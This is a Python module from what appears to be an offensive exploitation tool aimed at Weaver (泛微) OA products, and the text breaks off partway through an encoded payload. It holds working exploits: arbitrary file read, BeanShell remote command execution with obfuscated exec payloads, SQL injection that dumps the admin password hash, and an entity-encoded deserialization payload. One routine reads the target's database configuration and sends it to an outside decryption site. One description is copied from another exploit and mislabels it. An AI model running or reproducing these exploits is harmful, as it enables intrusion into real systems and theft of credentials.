from lib.util.exprequest import ExpRequest
from lib.util.output import Output
from lib.util.fun import *
import lib.util.globalvar as GlobalVar
import prettytable as pt
import re
import base64
import zipfile
"""
+-------------+----------------------------+---------------------------------------------------------------------------------+
| Target type | Vuln Name                  | Impact Version && Vulnerability description                                     |
+-------------+----------------------------+---------------------------------------------------------------------------------+
| oa_weaver   | E_Bridge_file_reading      | [file reading] title="泛微云桥e-Bridge"                                          |
| oa_weaver   | E_Weaver_any_file_read_exp | [file reading] app="泛微-E-Weaver" 泛微协同管理配置平台(e-weaver)                 |
| oa_weaver   | E_cology_bsh_rce           | [rce] app="泛微-协同办公OA" E-cology 7.0 E-cology 8.0 E-cology 8.1 E-cology 9.0  |
| oa_weaver   | E_cology_db_file_read      | [file reading] app="泛微-协同办公OA" 泛微协同办公应用平台(e-cology)                |
| oa_weaver   | Ecology9_sql               | [sql] app="泛微-协同办公OA" Ecology9 <=10.55                                     |
+-------------+----------------------------+---------------------------------------------------------------------------------+
"""
class oa_weaver():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.timeout = env.get('timeout')
        self.flag = GlobalVar.get_value('flag')

    def E_Bridge_file_reading(self):
        appName = 'oa_weaver'
        pocname = 'E_Bridge_file_reading'
        path1 = '/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt'
        path2 = '/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt'
        path3 = '/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///&fileExt=txt'
        method = 'get'
        desc = '[file reading] 泛微云桥任意文件读取 title="泛微云桥e-Bridge"'
        data = ''
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                r1 = exprequest.get(
                    url=self.url+path1, 
                    data=data,
                    )
                r2 = exprequest.get(
                    url=self.url+path2, 
                    data=data, 
                    )
                if "无法验证您的身份" in r1.text and "无法验证您的身份" in r2.text:
                    return output.fail()
                else:
                    if "No such file or directory" in r1.text or "系统找不到指定的路径" in r2.text:
                        return output.no_echo_success(method, desc)
                    else:
                        return output.fail()
            else:
                r = exprequest.get(
                    url=self.url+"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file://{}&fileExt=txt".format("/etc/a"), 
                    data=data)
                #windows
                if '系统找不到指定的路径' in r.text:
                    r1 = exprequest.get(
                        url=self.url+"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///{}&fileExt=txt".format(self.cmd), 
                        data=data)         
                    try:
                        id2 = re.findall(r'"id":"(.*?)"', r1.text)[0]
                    except Exception:
                        id2 = ''
                #linux
                elif 'No such file or directory' in r.text:
                    r2 = exprequest.get(
                        url=self.url+"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file://{}&fileExt=txt".format(self.cmd),
                        data=data)         
                    try:
                        id2 = re.findall(r'"id":"(.*?)"', r2.text)[0]
                    except Exception:
                        id2 = ''
                else:
                     id2 = ''
                
                r3 = exprequest.get(
                    url=self.url+"/file/fileNoLogin/{}".format(id2), 
                    data=data)
                print(r3.text)
        except Exception as error:
            return output.error_output(str(error))

    def E_cology_bsh_rce(self):
        appName = 'oa_weaver'
        pocname = 'E_cology_bsh_rce'
        path1 = '/bsh.servlet.BshServlet'
        path2 = '/weaver/bsh.servlet.BshServlet'
        path3 = '/weaveroa/bsh.servlet.BshServlet'
        path4 = '/oa/bsh.servlet.BshServlet'
        method = 'post'
        desc = '[rce] 泛微OA Bsh 远程代码执行漏洞 CNVD-2019-32204 app="泛微-协同办公OA" E-cology 7.0、8.0、8.1、9.0'
        data1 = 'bsh.script=exec("{}");&bsh.servlet.output=raw'
        data2 = 'bsh.script=\u0065\u0078\u0065\u0063("{}");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw'
        data3 = 'bsh.script=eval%00("ex"%2b"ec(bsh.httpServletRequest.getParameter(\\"command\\"))");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&command={}'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                for path in (path1, path2, path3, path4):
                    for data in (data1, data2, data3):
                            r = exprequest.post(
                                url=self.url+path, 
                                data=data.format('echo '+self.flag), 
                                headers=headers,
                                )                        
                            if self.flag == r.text:
                                return output.echo_success(method, desc)
                return output.fail()
            else:
                for path in (path1, path2, path3, path4):
                    r = exprequest.post(
                        url=self.url+path,
                        data=data1,
                        headers=headers,
                        )
                    if 'BeanShell Test Servlet' in r.text:
                        path = path
                        break
                r = exprequest.post(
                    url=self.url+path,
                    data=data1.format(self.cmd),
                    headers=headers,
                    timeout=self.timeout, 
                    verify=False
                    )
                print(r.text)
        except Exception as error:
            return output.error_output(str(error))
        
    def E_cology_db_file_read(self):
        appName = 'oa_weaver'
        pocname = 'E_cology_db_file_read'
        path = '/mobile/DBconfigReader.jsp'
        method = 'get'
        desc = '[file reading] 泛微OA E-Cology 数据库配置信息泄漏 app="泛微-协同办公OA"'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(
                    url=self.url+path, 
                    data=data, 
                    headers=headers,
                    allow_redirects=False,
                    )
                if r.status_code == 200:
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.get(
                    url=self.url+path,
                    data=data, 
                    headers=headers,
                    ).text
                result = result.replace('\r\n','')
                res1 = base64.b64encode(result)
                postdata = {
                    'data':res1,
                    'type':'des',
                    'arg':'m=ecb_pad=zero_p=1z2x3c4v_o=0_s=gb2312_t=1'
                }
                r = exprequest.post(
                    url='http://tool.chacuo.net/cryptdes', 
                    data=postdata, 
                    headers={'Content-Type':'application/x-www-form-urlencoded'},
                    )
                import ast
                dbData = ast.literal_eval(r.text)['data']
                print(dbData)
        except Exception as error:
            return output.error_output(str(error))

    def E_cology_v8_sql(self):
        appName = 'oa_weaver'
        pocname = 'E_cology_v8_sql'
        path = "/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager"
        method = 'get'
        desc = '[file reading] 泛微OA V8 前台 SQL注入获取管理员 sysadmin MD5的密码值 app="泛微-协同办公OA"'
        data = ''
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 
            'Connection': 'close', 
            'Accept-Encoding': 'gzip, deflate', 
            'Accept': '*/*'
            }
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(
                    url=self.url+path, 
                    data=data, 
                    headers=headers,
                    allow_redirects=False,
                    )
                if r.status_code == 200 and 'html' not in r.text:
                    return output.echo_success(method, desc)
                else:
                    return output.fail()
            else:
                r = exprequest.get(
                    url=self.url+path, 
                    data=data, 
                    headers=headers,
                    allow_redirects=False,
                    )
                print(r.text.strip())
        except Exception as error:
            return output.error_output(str(error))

    def E_cology_workflowServiceXml_rce(self):
        appName = 'oa_weaver'
        pocname = 'E_cology_workflowServiceXml_rce'
        path = '/services%20/WorkflowServiceXml'
        method = 'post'
        desc = '[file reading] 泛微OA V8 前台 SQL注入获取管理员 sysadmin MD5的密码值 app="泛微-协同办公OA"'
        data = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.services.weaver.com.cn">
                    <soapenv:Header/>
                        <soapenv:Body>
                            <web:doCreateWorkflowRequest>
                                <web:string>
                                    &#60;&#106;&#97;&#118;&#97;&#46;&#117;&#116;&#105;&#108;&#46;&#80;&#114;&#105;&#111;&#114;&#105;&#116;&#121;&#81;&#117;&#101;&#117;&#101;&#32;&#115;&#101;&#114;&#105;&#97;&#108;&#105;&#122;&#97;&#116;&#105;&#111;&#110;&#61;&#39;&#99;&#117;&#115;&#116;&#111;&#109;&#39;&#62;&#10;&#32;&#32;&#60;&#117;&#110;&#115;&#101;&#114;&#105;&#97;&#108;&#105;&#122;&#97;&#98;&#108;&#101;&#45;&#112;&#97;&#114;&#101;&#110;&#116;&#115;&#47;&#62;&#10;&#32;&#32;&#60;&#106;&#97;&#118;&#97;&#46;&#117;&#116;&#105;&#108;&#46;&#80;&#114;&#105;&#111;&#114;&#105;&#116;&#121;&#81;&#117;&#101;&#117;&#101;&#62;&#10;&#32;&#32;&#32;&#32;&#60;&#100;&#101;&#102;&#97;&#117;&#108;&#116;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#115;&#105;&#122;&#101;&#62;&#50;&#60;&#47;&#115;&#105;&#122;&#101;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#99;&#111;&#109;&#112;&#97;&#114;&#97;&#116;&#111;&#114;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#106;&#97;&#118;&#97;&#102;&#120;&#46;&#99;&#111;&#108;&#108;&#101;&#99;&#116;&#105;&#111;&#110;&#115;&#46;&#79;&#98;&#115;&#101;&#114;&#118;&#97;&#98;&#108;&#101;&#76;&#105;&#115;&#116;&#36;&#49;&#39;&#47;&#62;&#10;&#32;&#32;&#32;&#32;&#60;&#47;&#100;&#101;&#102;&#97;&#117;&#108;&#116;&#62;&#10;&#32;&#32;&#32;&#32;&#60;&#105;&#110;&#116;&#62;&#51;&#60;&#47;&#105;&#110;&#116;&#62;&#10;&#32;&#32;&#32;&#32;&#60;&#99;&#111;&#109;&#46;&#115;&#117;&#110;&#46;&#120;&#109;&#108;&#46;&#105;&#110;&#116;&#101;&#114;&#110;&#97;&#108;&#46;&#98;&#105;&#110;&#100;&#46;&#118;&#50;&#46;&#114;&#117;&#110;&#116;&#105;&#109;&#101;&#46;&#117;&#110;&#109;&#97;&#114;&#115;&#104;&#97;&#108;&#108;&#101;&#114;&#46;&#66;&#97;&#115;&#101;&#54;&#52;&#68;&#97;&#116;&#97;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#100;&#97;&#116;&#97;&#72;&#97;&#110;&#100;&#108;&#101;&#114;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#100;&#97;&#116;&#97;&#83;&#111;&#117;&#114;&#99;&#101;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#99;&#111;&#109;&#46;&#115;&#117;&#110;&#46;&#120;&#109;&#108;&#46;&#105;&#110;&#116;&#101;&#114;&#110;&#97;&#108;&#46;&#119;&#115;&#46;&#101;&#110;&#99;&#111;&#100;&#105;&#110;&#103;&#46;&#120;&#109;&#108;&#46;&#88;&#77;&#76;&#77;&#101;&#115;&#115;&#97;&#103;&#101;&#36;&#88;&#109;&#108;&#68;&#97;&#116;&#97;&#83;&#111;&#117;&#114;&#99;&#101;&#39;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#99;&#111;&#110;&#116;&#101;&#110;&#116;&#84;&#121;&#112;&#101;&#62;&#116;&#101;&#120;&#116;&#47;&#112;&#108;&#97;&#105;&#110;&#60;&#47;&#99;&#111;&#110;&#116;&#101;&#110;&#116;&#84;&#121;&#112;&#101;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#105;&#115;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#106;&#97;&#118;&#97;&#46;&#105;&#111;&#46;&#83;&#101;&#113;&#117;&#101;&#110;&#99;&#101;&#73;&#110;&#112;&#117;&#116;&#83;&#116;&#114;&#101;&#97;&#109;&#39;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#101;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#106;&#97;&#118;&#97;&#120;&#46;&#115;&#119;&#105;&#110;&#103;&#46;&#77;&#117;&#108;&#116;&#105;&#85;&#73;&#68;&#101;&#102;&#97;&#117;&#108;&#116;&#115;&#36;&#77;&#117;&#108;&#116;&#105;&#85;&#73;&#68;&#101;&#102;&#97;&#117;&#108;&#116;&#115;&#69;&#110;&#117;&#109;&#101;&#114;&#97;&#116;&#111;&#114;&#39;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#105;&#116;&#101;&#114;&#97;&#116;&#111;&#114;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#99;&#111;&#109;&#46;&#115;&#117;&#110;&#46;&#116;&#111;&#111;&#108;&#115;&#46;&#106;&#97;&#118;&#97;&#99;&#46;&#112;&#114;&#111;&#99;&#101;&#115;&#115;&#105;&#110;&#103;&#46;&#74;&#97;&#118;&#97;&#99;&#80;&#114;&#111;&#99;&#101;&#115;&#115;&#105;&#110;&#103;&#69;&#110;&#118;&#105;&#114;&#111;&#110;&#109;&#101;&#110;&#116;&#36;&#78;&#97;&#109;&#101;&#80;&#114;&#111;&#99;&#101;&#115;&#115;&#73;&#116;&#101;&#114;&#97;&#116;&#111;&#114;&#39;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#110;&#97;&#109;&#101;&#115;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#106;&#97;&#118;&#97;&#46;&#117;&#116;&#105;&#108;&#46;&#65;&#98;&#115;&#116;&#114;&#97;&#99;&#116;&#76;&#105;&#115;&#116;&#36;&#73;&#116;&#114;&#39;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#99;&#117;&#114;&#115;&#111;&#114;&#62;&#48;&#60;&#47;&#99;&#117;&#114;&#115;&#111;&#114;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#108;&#97;&#115;&#116;&#82;&#101;&#116;&#62;&#45;&#49;&#60;&#47;&#108;&#97;&#115;&#116;&#82;&#101;&#116;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#101;&#120;&#112;&#101;&#99;&#116;&#101;&#100;&#77;&#111;&#100;&#67;&#111;&#117;&#110;&#116;&#62;&#48;&#60;&#47;&#101;&#120;&#112;&#101;&#99;&#116;&#101;&#100;&#77;&#111;&#100;&#67;&#111;&#117;&#110;&#116;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#111;&#117;&#116;&#101;&#114;&#45;&#99;&#108;&#97;&#115;&#115;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#106;&#97;&#118;&#97;&#46;&#117;&#116;&#105;&#108;&#46;&#65;&#114;&#114;&#97;&#121;&#115;&#36;&#65;&#114;&#114;&#97;&#121;&#76;&#105;&#115;&#116;&#39;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#97;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#115;&#116;&#114;&#105;&#110;&#103;&#45;&#97;&#114;&#114;&#97;&#121;&#39;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#115;&#116;&#114;&#105;&#110;&#103;&#62;&#36;&#36;&#66;&#67;&#69;&#76;&#36;&#36;&#36;&#108;&#36;&#56;&#98;&#36;&#73;&#36;&#65;&#36;&#65;&#36;&#65;&#36;&#65;&#36;&#65;&#36;&#65;&#36;&#65;&#36;&#97;&#100;&#87;&#36;&#55;&#98;&#120;&#36;&#85;&#36;&#100;&#53;&#36;&#86;&#36;&#102;&#102;&#36;&#100;&#100;&#100;&#119;&#103;&#50;&#36;&#57;&#57;&#36;&#56;&#53;&#100;&#66;&#36;&#67;&#36;&#56;&#51;&#36;&#80;&#36;&#57;&#54;&#36;&#65;&#113;&#36;&#66;&#119;&#36;&#88;&#36;&#100;&#48;&#36;&#97;&#50;&#78;&#36;&#56;&#56;&#36;&#57;&#50;&#36;&#99;&#52;&#36;&#54;&#48;&#36;&#67;&#36;&#110;&#104;&#54;&#36;&#89;&#36;&#68;&#36;&#67;&#36;&#36;&#36;&#98;&#51;&#36;&#57;&#51;&#100;&#97;&#119;&#102;&#36;&#57;&#100;&#36;&#57;&#100;&#36;&#114;&#80;&#107;&#36;&#100;&#53;&#36;&#57;&#54;&#36;&#98;&#101;&#95;&#86;&#36;&#53;&#98;&#36;&#119;&#36;&#98;&#54;&#36;&#98;&#53;&#106;&#36;&#97;&#53;&#105;&#36;&#101;&#100;&#67;&#109;&#36;&#101;&#98;&#36;&#115;&#36;&#114;&#36;&#56;&#50;&#36;&#98;&#54;&#36;&#97;&#53;&#104;&#36;&#97;&#57;&#36;&#55;&#100;&#36;&#100;&#49;&#36;&#97;&#97;&#36;&#97;&#100;&#36;&#99;&#53;&#36;&#100;&#97;&#98;&#36;&#100;&#102;&#79;&#36;&#102;&#98;&#36;&#102;&#56;&#36;&#97;&#51;&#95;&#36;&#98;&#102;&#36;&#55;&#101;&#36;&#97;&#52;&#36;&#101;&#55;&#36;&#99;&#101;&#102;&#36;&#57;&#51;&#36;&#121;&#36;&#100;&#57;&#36;&#75;&#36;&#55;&#102;&#52;&#95;&#114;&#103;&#36;&#101;&#101;&#57;&#36;&#101;&#55;&#36;&#102;&#101;&#36;&#99;&#101;&#36;&#102;&#98;&#36;&#100;&#99;&#36;&#99;&#57;&#36;&#56;&#57;&#51;&#36;&#56;&#55;&#36;&#56;&#102;&#36;&#67;&#88;&#36;&#56;&#53;&#36;&#55;&#102;&#72;&#36;&#56;&#56;&#36;&#97;&#48;&#95;&#36;&#99;&#52;&#36;&#56;&#48;&#36;&#56;&#56;&#65;&#36;&#74;&#36;&#74;&#36;&#101;&#99;&#36;&#57;&#50;&#36;&#109;&#98;&#36;&#98;&#55;&#36;&#56;&#56;&#36;&#113;&#36;&#55;&#102;&#36;&#97;&#54;&#36;&#69;&#36;&#57;&#56;&#36;&#111;&#36;&#121;&#36;&#82;&#105;&#36;&#82;&#36;&#98;&#55;&#36;&#56;&#97;&#36;&#98;&#48;&#36;&#114;&#100;&#36;&#101;&#48;&#36;&#102;&#48;&#36;&#114;&#36;&#120;&#97;&#36;&#80;&#36;&#56;&#54;&#36;&#69;&#36;&#101;&#99;&#36;&#57;&#53;&#80;&#36;&#56;&#53;&#36;&#55;&#100;&#36;&#67;&#36;&#100;&#101;&#36;&#121;&#65;&#36;&#99;&#49;&#109;&#36;&#55;&#99;&#121;&#36;&#56;&#98;&#36;&#56;&#48;&#36;&#100;&#98;&#36;&#114;&#36;&#100;&#52;&#36;&#97;&#50;&#36;&#57;&#102;&#36;&#95;&#111;&#36;&#101;&#53;&#36;&#99;&#98;&#36;&#106;&#36;&#105;&#36;&#101;&#57;&#78;&#36;&#82;&#119;&#36;&#102;&#49;&#36;&#56;&#51;&#111;&#36;&#84;&#36;&#102;&#48;&#118;&#36;&#74;&#36;&#88;&#99;&#36;&#98;&#102;&#36;&#56;&#48;&#119;&#36;&#56;&#56;&#120;&#36;&#97;&#55;&#36;&#56;&#52;&#36;&#81;&#36;&#100;&#101;&#36;&#114;&#36;&#101;&#49;&#36;&#100;&#100;&#120;&#36;&#80;&#95;&#36;&#100;&#101;&#36;&#120;&#36;&#101;&#50;&#36;&#55;&#100;&#36;&#57;&#99;&#36;&#102;&#50;&#36;&#55;&#101;&#36;&#82;&#36;&#108;&#36;&#81;&#36;&#102;&#48;&#65;&#36;&#82;&#36;&#108;&#36;&#83;&#113;&#55;&#36;&#98;&#55;&#36;&#101;&#102;&#36;&#99;&#51;&#36;&#57;&#99;&#122;&#36;&#56;&#102;&#36;&#56;&#56;&#36;&#55;&#98;&#69;&#36;&#55;&#99;&#68;&#36;&#99;&#48;&#71;&#36;&#102;&#57;&#36;&#101;&#101;&#36;&#56;&#48;&#36;&#56;&#48;&#36;&#56;&#102;&#36;&#56;&#57;&#36;&#98;&#56;&#79;&#36;&#99;&#50;&#65;&#36;&#100;&#99;&#36;&#95;&#36;&#101;&#48;&#36;&#101;&#51;&#36;&#83;&#36;&#98;&#57;&#36;&#100;&#50;&#36;&#95;&#36;&#101;&#48;&#36;&#84;&#36;&#83;&#36;&#36;&#36;&#99;&#55;&#36;&#116;&#36;&#102;&#57;&#36;&#102;&#50;&#36;&#65;&#95;&#36;&#101;&#101;&#36;&#101;&#48;&#36;&#101;&#52;&#79;&#113;&#36;&#102;&#100;&#36;&#80;&#36;&#75;&#120;&#72;&#36;&#56;&#50;&#36;&#99;&#54;&#36;&#99;&#100;&#36;&#101;&#97;&#36;&#99;&#52;&#36;&#99;&#51;&#36;&#57;&#99;&#36;&#102;&#50;&#105;&#36;&#98;&#101;&#36;&#55;&#100;&#68;&#36;&#99;&#50;&#36;&#110;&#36;&#55;&#99;&#36;&#56;&#54;&#111;&#36;&#56;&#55;&#69;&#36;&#55;&#99;&#36;&#57;&#54;&#36;&#101;&#51;&#36;&#55;&#101;&#78;&#36;&#99;&#52;&#36;&#97;&#51;&#36;&#111;&#36;&#51;&#101;&#36;&#95;&#36;&#101;&#50;&#36;&#76;&#36;&#111;&#36;&#98;&#101;&#36;&#99;&#56;&#36;&#90;&#95;&#36;&#101;&#50;&#36;&#51;&#101;&#36;&#51;&#99;&#36;&#115;&#36;&#101;&#50;&#113;&#36;&#82;&#79;&#36;&#56;&#56;&#36;&#102;&#56;&#36;&#98;&#50;&#36;&#56;&#48;&#36;&#97;&#102;&#48;&#36;&#102;&#56;&#36;&#100;&#54;&#36;&#113;&#36;&#99;&#99;&#36;&#56;&#52;&#115;&#53;&#67;&#121;&#112;&#36;&#101;&#57;&#36;&#56;&#100;&#36;&#77;&#36;&#57;&#101;&#86;&#36;&#120;&#110;&#48;&#36;&#99;&#99;&#36;&#101;&#101;&#76;&#36;&#57;&#56;&#70;&#87;&#54;&#36;&#98;&#53;&#36;&#100;&#51;&#36;&#98;&#48;&#36;&#55;&#98;&#98;&#36;&#51;&#98;&#36;&#57;&#51;&#68;&#36;&#97;&#57;&#52;&#36;&#102;&#54;&#36;&#103;&#122;&#36;&#97;&#98;&#36;&#57;&#53;&#74;&#36;&#99;&#53;&#36;&#99;&#99;&#56;&#67;&#67;&#36;&#98;&#48;&#115;&#87;&#108;&#79;&#36;&#121;&#36;&#57;&#50;&#36;&#56;&#99;&#36;&#57;&#57;&#36;&#68;&#36;&#57;&#49;&#36;&#97;&#56;&#99;&#36;&#116;&#36;&#99;&#99;&#36;&#56;&#49;&#36;&#99;&#54;&#36;&#97;&#53;&#51;&#73;&#36;&#77;&#36;&#102;&#101;&#36;&#97;&#56;&#36;&#84;&#36;&#100;&#51;&#119;&#111;&#36;&#56;&#99;&#36;&#97;&#53;&#36;&#53;&#100;&#36;&#89;&#36;&#99;&#97;&#36;&#56;&#49;&#36;&#56;&#48;&#36;&#97;&#102;&#36;&#75;&#120;&#82;&#36;&#52;&#48;&#36;&#56;&#101;&#36;&#111;&#78;&#36;&#99;&#49;&#36;&#97;&#54;&#36;&#89;&#36;&#75;&#36;&#89;&#97;&#36;&#57;&#48;&#36;&#100;&#97;&#36;&#102;&#54;&#36;&#101;&#97;&#70;&#36;&#100;&#97;&#73;&#88;&#102;&#70;&#36;&#99;&#48;&#36;&#117;&#36;&#56;&#51;&#36;&#98;&#56;&#70;&#79;&#36;&#98;&#97;&#36;&#56;&#54;&#81;&#112;&#36;&#70;&#36;&#55;&#99;&#36;&#56;&#100;&#36;&#111;&#68;&#36;&#99;&#49;&#36;&#83;&#112;&#36;&#57;&#56;&#36;&#113;&#36;&#97;&#51;&#86;&#36;&#100;&#54;&#36;&#100;&#54;&#36;&#56;&#100;&#117;&#36;&#74;&#110;&#36;&#57;&#53;&#36;&#98;&#102;&#36;&#100;&#98;&#36;&#99;&#56;&#36;&#97;&#52;&#36;&#101;&#57;&#36;&#56;&#99;&#36;&#82;&#36;&#101;&#54;&#36;&#98;&#97;&#101;&#108;&#68;&#36;&#88;&#36;&#68;&#36;&#89;&#36;&#69;&#36;&#120;&#36;&#84;&#54;&#99;&#36;&#118;&#82;&#56;&#36;&#115;&#36;&#101;&#51;&#36;&#118;&#116;&#36;&#99;&#98;&#56;&#36;&#56;&#50;&#36;&#97;&#51;&#36;&#101;&#52;&#36;&#101;&#51;&#80;&#36;&#99;&#50;&#36;&#57;&#52;&#36;&#102;&#49;&#52;&#36;&#57;&#101;&#97;&#36;&#97;&#56;&#36;&#51;&#97;&#36;&#100;&#98;&#88;&#36;&#51;&#97;&#36;&#97;&#52;&#36;&#97;&#55;&#36;&#101;&#50;&#97;&#114;&#36;&#57;&#51;&#36;&#97;&#49;&#36;&#121;&#36;&#97;&#50;&#36;&#100;&#51;&#54;&#36;&#98;&#50;&#51;&#97;&#70;&#50;&#36;&#56;&#51;&#36;&#98;&#52;&#36;&#78;&#36;&#101;&#57;&#36;&#67;&#36;&#98;&#101;&#36;&#36;&#36;&#101;&#51;&#36;&#104;&#36;&#102;&#56;&#36;&#97;&#54;&#36;&#56;&#99;&#99;&#36;&#102;&#56;&#36;&#87;&#57;&#36;&#109;&#36;&#101;&#51;&#56;&#36;&#57;&#101;&#101;&#80;&#36;&#53;&#100;&#36;&#57;&#52;&#36;&#56;&#52;&#36;&#86;&#36;&#101;&#57;&#48;&#36;&#100;&#51;&#89;&#36;&#56;&#55;&#36;&#56;&#48;&#36;&#56;&#99;&#88;&#36;&#97;&#97;&#36;&#100;&#98;&#36;&#56;&#56;&#36;&#99;&#53;&#36;&#78;&#36;&#57;&#98;&#36;&#100;&#98;&#36;&#102;&#50;&#36;&#105;&#67;&#36;&#53;&#100;&#65;&#36;&#97;&#48;&#36;&#114;&#36;&#100;&#98;&#36;&#100;&#102;&#111;&#36;&#100;&#56;&#70;&#36;&#55;&#99;&#36;&#56;&#97;&#36;&#102;&#98;&#109;&#36;&#90;&#36;&#116;&#36;&#98;&#56;&#81;&#115;&#36;&#99;&#102;&#36;&#98;&#54;&#36;&#97;&#52;&#36;&#114;&#36;&#57;&#98;&#72;&#36;&#98;&#97;&#50;&#36;&#100;&#102;&#36;&#99;&#49;&#36;&#102;&#51;&#50;&#36;&#98;&#101;&#36;&#56;&#98;&#36;&#97;&#51;&#50;&#36;&#98;&#101;&#36;&#56;&#55;&#36;&#101;&#102;&#51;&#36;&#100;&#52;&#119;&#89;&#36;&#66;&#36;&#100;&#98;&#36;&#99;&#56;&#100;&#36;&#57;&#51;&#78;&#36;&#99;&#48;&#36;&#98;&#50;&#36;&#68;&#36;&#90;&#36;&#120;&#101;&#56;&#36;&#56;&#51;&#36;&#113;&#36;&#107;&#36;&#89;&#50;&#76;&#36;&#116;&#48;&#100;&#36;&#53;&#98;&#36;&#101;&#54;&#36;&#99;&#48;&#66;&#110;&#36;&#100;&#101;&#36;&#80;&#36;&#89;&#106;&#36;&#97;&#54;&#36;&#109;&#36;&#116;&#36;&#101;&#51;&#36;&#119;&#36;&#101;&#51;&#36;&#56;&#55;&#56;&#89;&#36;&#101;&#52;&#119;&#36;&#99;&#102;&#36;&#109;&#36;&#57;&#57;&#75;&#36;&#99;&#57;&#36;&#57;&#52;&#36;&#106;&#36;&#102;&#55;&#36;&#97;&#53;&#36;&#100;&#51;&#36;&#100;&#50;&#99;&#36;&#99;&#57;&#36;&#56;&#99;&#36;&#56;&#99;&#36;&#108;&#36;&#101;&#49;&#36;&#99;&#55;&#36;&#85;&#113;&#36;&#90;&#36;&#95;&#36;&#101;&#48;&#69;&#36;&#90;&#36;&#95;&#36;&#101;&#49;&#36;&#116;&#36;&#77;&#36;&#56;&#98;&#36;&#102;&#57;&#36;&#57;&#57;&#48;&#36;&#51;&#102;&#36;&#84;&#36;&#101;&#101;&#36;&#57;&#57;&#36;&#83;&#36;&#53;&#100;&#36;&#51;&#99;&#36;&#101;&#100;&#36;&#57;&#100;&#36;&#83;&#36;&#121;&#36;&#101;&#51;&#36;&#97;&#55;&#120;&#36;&#57;&#57;&#36;&#99;&#49;&#36;&#101;&#98;&#36;&#101;&#52;&#36;&#101;&#98;&#36;&#97;&#53;&#102;&#36;&#101;&#98;&#36;&#98;&#52;&#114;&#36;&#100;&#56;&#36;&#98;&#52;&#115;&#36;&#57;&#55;&#36;&#97;&#49;&#36;&#51;&#98;&#84;&#36;&#79;&#36;&#99;&#98;&#36;&#99;&#101;&#36;&#72;&#105;&#113;&#36;&#57;&#98;&#36;&#101;&#57;&#36;&#100;&#56;&#36;&#102;&#98;&#36;&#73;&#106;&#79;&#36;&#121;